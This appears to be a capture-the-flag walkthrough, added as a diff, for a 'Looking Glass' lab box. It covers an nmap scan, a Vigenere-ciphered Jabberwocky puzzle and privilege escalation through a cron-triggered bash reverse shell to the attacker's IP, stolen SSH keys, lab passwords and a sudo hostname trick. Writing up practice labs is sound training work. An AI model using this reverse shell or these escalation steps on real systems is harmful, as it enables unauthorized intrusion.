@@ -1,0 +1,286 @@
+//Through the Looking Glass//
+
+{{NMAP SCAN}}
+
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-31 12:51 EST
+Nmap scan report for [machine IP]
+Host is up (0.12s latency).
+Not shown: 916 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9100/tcp  open  jetdirect?
+9101/tcp  open  jetdirect?
+9102/tcp  open  jetdirect?
+9103/tcp  open  jetdirect?
+9110/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9111/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9200/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9207/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9220/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+9290/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+(etc, etc.... every port is open)
+
+
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.06 seconds
+
+Selecting one at random to connect to, we are met with a message saying either "lower" or "higher", though they seem to be backwards:
+
+techtyte@Discordia:~/Downloads$ ssh root@10.10.4.3 -p 9503
+The authenticity of host '[10.10.4.3]:9503 ([10.10.4.3]:9503)' can't be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.4.3]:9503' (RSA) to the list of known hosts.
+Lower
+Connection to 10.10.4.3 closed.
+techtyte@Discordia:~/Downloads$ ssh root@10.10.4.3 -p 9618
+The authenticity of host '[10.10.4.3]:9618 ([10.10.4.3]:9618)' can't be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.4.3]:9618' (RSA) to the list of known hosts.
+Higher
+Connection to 10.10.4.3 closed.
+
+This part appears to be randomized per machine start, along with the ssh password
+(I messed up later on and had to restart the box, and had to do this part over again!)
+
+Keep plugging in port numbers, going higher when it says lower, and lower when it says higher until you see:
+
+ssh root@10.10.4.3 -p 9612
+The authenticity of host '[10.10.4.3]:9612 ([10.10.4.3]:9612)' can't be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.4.3]:9612' (RSA) to the list of known hosts.
+You've found the real service.
+Solve the challenge to get access to the box
+Jabberwocky
+'Mdes mgplmmz, cvs alv lsmtsn aowil
+Fqs ncix hrd rxtbmi bp bwl arul;
+Elw bpmtc pgzt alv uvvordcet,
+Egf bwl qffl vaewz ovxztiql.
+
+'Fvphve ewl Jbfugzlvgb, ff woy!
+Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
+Bplhrf xag Rjinlu imro, pud tlnp
+Bwl jintmofh Iaohxtachxta!'
+
+Oi tzdr hjw oqzehp jpvvd tc oaoh:
+Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
+Hv rfwmgl wl fp moi Tfbaun xkgm,
+Puh jmvsd lloimi bp bwvyxaa.
+
+Eno pz io yyhqho xyhbkhe wl sushf,
+Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
+Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
+Pud cykdttk ej ba gaxt!
+
+Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
+Ewl vpvict qseux dine huidoxt-achgb!
+Al peqi pt eitf, ick azmo mtd wlae
+Lx ymca krebqpsxug cevm.
+
+'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
+Cpqx vw bf eifz, qy mthmjwa dwn!
+V jitinofh kaz! Gtntdvl! Ttspaj!'
+Wl ciskvttk me apw jzn.
+
+'Awbw utqasmx, tuh tst zljxaa bdcij
+Wph gjgl aoh zkuqsi zg ale hpie;
+Bpe oqbzc nxyi tst iosszqdtz,
+Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+Enter Secret:	
+
+Going to https://www.dcode.fr/cipher-identifier and plugging in the puzzle, the highest rated result is the Vigenere Cipher.
+It appears to be correct, https://www.guballa.de/vigenere-solver figures out the key to be "thealphabetcipher" and produces this result:
+
+'Twas brillig, and the slithy toves
+Did gyre and gimble in the wabe;
+All mimsy were the borogoves,
+And the mome raths outgrabe.
+
+'Beware the Jabberwock, my son!
+The jaws that bite, the claws that catch!
+Beware the Jubjub bird, and shun
+The frumious Bandersnatch!'
+
+He took his vorpal sword in hand:
+Long time the manxome foe he sought--
+So rested he by the Tumtum tree,
+And stood awhile in thought.
+
+And as in uffish thought he stood,
+The Jabberwock, with eyes of flame,
+Came whiffling through the tulgey wood,
+And burbled as it came!
+
+One, two! One, two! And through and through
+The vorpal blade went snicker-snack!
+He left it dead, and with its head
+He went galumphing back.
+
+'And hast thou slain the Jabberwock?
+Come to my arms, my beamish boy!
+O frabjous day! Callooh! Callay!'
+He chortled in his joy.
+
+'Twas brillig, and the slithy toves
+Did gyre and gimble in the wabe;
+All mimsy were the borogoves,
+And the mome raths outgrabe.
+Your secret is bewareTheJabberwock
+
+And we have our secret! Entering it tells us the ssh credentials:
+jabberwock:FollowedMeasurementsBeginNightcap (this may be different for you)
+
+{{USER:JABBERWOCK}}
+
+Grab user.txt in the home folder, but use rev instead of cat to mirror the text the correct way.
+poem.txt seems to be the same poem we just solved.
+twasBrillig.sh gives us:
+wall $(cat /home/jabberwock/poem.txt)
+
+The wall command displays a message on all of the terminals of logged in users.
+
+Sudo -l reveals:
+User jabberwock may run the following commands on looking-glass:
+    (root) NOPASSWD: /sbin/reboot
+    
+SUID, capabilities, all turn up nothing.
+Cron jobs?
+
+cat /etc/crontab
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
+
+So, the twasBrillig script will run on reboot, and we can reboot as sudo. Hmmmmmmmm
+
+Let's replace the contents with a reverse shell:
+
+bash -i >& /dev/tcp/[your IP]/[port] 0>&1
+
+Start a listener (nc -lvnp [port number]) and reboot the system:
+sudo /sbin/reboot
+
+Catch the shell and see: tweedledum@looking-glass:~$ 
+
+{{USER:TWEEDLEDUM}}
+
+Let's check out what's in tweedledum's home folder:
+
+cat poem.txt
+     'Tweedledum and Tweedledee
+      Agreed to have a battle;
+     For Tweedledum said Tweedledee
+      Had spoiled his nice new rattle.
+
+     Just then flew down a monstrous crow,
+      As black as a tar-barrel;
+     Which frightened both the heroes so,
+      They quite forgot their quarrel.'
+
+cat humptydumpty.txt
+dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+
+This appears to be a hash. Plugging it into hashes.com tells us:
+
+:the password is zyxwvutsrqponmlk
+
+sudo -l says:
+User tweedledum may run the following commands on looking-glass:
+    (tweedledee) NOPASSWD: /bin/bash
+
+Alright. Let's check tweedledee real quick:
+
+sudo -u tweedledee /bin/bash
+
+Looking in tweedledee's home folder, we see the exact same contents as tweedledum. And checking sudo permissions is just the same but reversed:
+User tweedledee may run the following commands on looking-glass:
+    (tweedledum) NOPASSWD: /bin/bash
+
+Nevermind, it is just a loop lol.
+
+Onto humptydumpty. We must first upgrade the shell:
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+Ctrl-Z
+stty raw -echo
+fg
+export TERM=xterm-256color
+
+su humptydumpty
+Enter the password at the prompt.
+
+{{USER:HUMPTYDUMPTY}}
+
+I was able to cd into alice's home folder, but not ls the contents. So, I took some educated guesses and kept traversing.
+
+cd .ssh
+cat id_rsa
+
+It works.
+
+Copy and paste into a new file.
+Ssh as alice with the key:
+sudo ssh alice@[machine IP] -i id_rsahere
+
+{{USER:ALICE}}
+
+Kitten.txt reads:
+
+She took her off the table as she spoke, and shook her backwards and forwards with all her might.
+
+The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—
+
+
+—and it really was a kitten, after all.
+
+
+We are unable to run sudo -l as we do not have alice's password.
+
+We can check the sudoers file, and see if anything turns up
+cd /etc/sudoers.d/
+cat alice
+
+alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+
+Trying to run sudo /bin/bash still prompts us for a password.
+But! We can change the hostname with the -h tag with sudo, from looking-glass to the mirrored ssalg-gnikool in order to run the command.
+
+sudo -h ssalg-gnikool /bin/bash
+
+We get an error, sudo: unable to resolve host ssalg-gnikool but we still obtain root!
+
+root flag is in /root/, but again use rev instead of cat to read it!
